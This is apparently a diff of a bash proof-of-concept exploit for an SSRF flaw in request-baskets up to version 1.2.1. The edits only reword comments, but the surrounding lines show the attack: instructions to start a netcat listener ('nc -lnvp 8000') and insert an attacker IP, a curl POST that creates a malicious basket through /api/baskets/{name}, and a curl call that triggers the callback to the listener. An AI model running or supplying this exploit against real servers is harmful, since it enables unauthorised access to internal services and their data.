@@ -2,9 +2,9 @@
 #this is a simpler version of the PoC on the internet and easier to use
 #it exploits the SSRF vulnerability on the request-baskets up to v1.2.1
 #via the component /api/baskets/{name}
-#while running this script make sure that you have netcat opened with its associated port 
+#while running this script make sure that you have Netcat opened with its associated port 
 #example nc -lnvp 8000
-#and on the attackersip remember to put your ip address plus the port number opened using netcat
+#and on the attackersip remember to put your IP address plus the port number opened using Netcat
 #
 #
 #
@@ -34,7 +34,7 @@ payload='{
   "capacity": 250
 }'
 
-# Send the POST request using curl with the specified JSON payload in headers
+# Send the POST request using curl with the specified JSON payload in the headers
 response=$(curl -s -X POST "$url/api/baskets/$basketname" \
   -H "Content-Type: application/json" \
   -H "$payload")
@@ -49,7 +49,7 @@ if [ "$http_status" -eq 201 ]; then
     # Output success message with the token
     echo "Basket name created successfully! Here is your basket name token: $token"
 	
-	# run the payload to connect to your netcat listener
+	# run the payload to connect to your Netcat listener
     run_payload="$url/$basketname"
     echo "Running the payload now... make sure that your netcat is running: $run_payload"
     curl -s "$run_payload"
